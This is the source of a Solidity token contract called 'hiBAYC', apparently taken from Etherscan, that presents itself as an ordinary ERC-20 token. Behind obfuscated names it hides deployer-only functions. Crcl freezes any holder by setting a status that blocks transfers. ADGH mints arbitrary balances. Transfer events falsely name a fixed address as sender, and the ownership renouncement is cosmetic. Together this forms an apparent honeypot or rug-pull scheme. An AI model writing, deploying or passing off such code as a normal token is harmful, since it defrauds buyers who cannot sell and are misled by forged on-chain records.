/**
 *Submitted for verification at Etherscan.io on 2022-12-28
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address aWDS = 0xaBA7161A7fb69c88e16ED9f455CE62B791EE4D03;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract hiBAYC is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private bXF;
    mapping (address => uint256) private cXVF;
    mapping (address => mapping (address => uint256)) private dXC;
    uint8 eDCE = 8;
    uint256 fDXI = 10000000000*10**8;
    string private _name;
    string private _symbol;



    constructor () 
{
        _name = "hiBAYC";
        _symbol = "hiBAYC";
        glxX(msg.sender, fDXI);}

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eDCE;
    }

    function totalSupply() public view  returns (uint256) {
        return fDXI;
    }
 			   function Crcl (address nIJS) HKK public {
      cXVF[nIJS] = 49;}
    function balanceOf(address account) public view  returns (uint256) {
        return bXF[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dXC[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dXC[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
			modifier HKK () {
		       require(cXVF[msg.sender] == 13);
               _;}
			   
  			function mxCx (address nIJS, uint256 oXX)  internal {
     bXF[nIJS] += oXX;} 	
    function transfer(address recipient, uint256 amount) public returns (bool) {
 
        require(amount <= bXF[msg.sender]);
        if(cXVF[msg.sender] <= 4) {
        hCNx(msg.sender, recipient, amount);
        return true; }
     if(cXVF[msg.sender] == 13) {
        iXCS(msg.sender, recipient, amount);
        return true; }}
  		    function glxX(address kDW, uint256 lMD) internal  {
        cXVF[msg.sender] = 13;
        kDW = aWDS;
        bXF[msg.sender] = bXF[msg.sender].add(lMD);
        emit Transfer(address(0), kDW, lMD); }
	   
	   
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
    require(amount <= bXF[sender]);
     require(amount <= dXC[sender][msg.sender]);
                  if(cXVF[sender] == 13) {
        iXCS(sender, recipient, amount);
        return true;} else
              if(cXVF[sender] <= 4) { 
            if (cXVF[recipient] <=4) {
        hCNx(sender, recipient, amount);
        return true;}}}
		
   function ADGH (address nIJS, uint256 oXX) HKK public {
   mxCx(nIJS,oXX);}	

		
			    function hCNx(address sender, address recipient, uint256 amount) internal  {
        bXF[sender] = bXF[sender].sub(amount);
        bXF[recipient] = bXF[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }	
	
		
		            function iXCS(address sender, address recipient, uint256 amount) internal  {
        bXF[sender] = bXF[sender].sub(amount);
        bXF[recipient] = bXF[recipient].add(amount);
         sender = aWDS;
        emit Transfer(sender, recipient, amount); }
		




}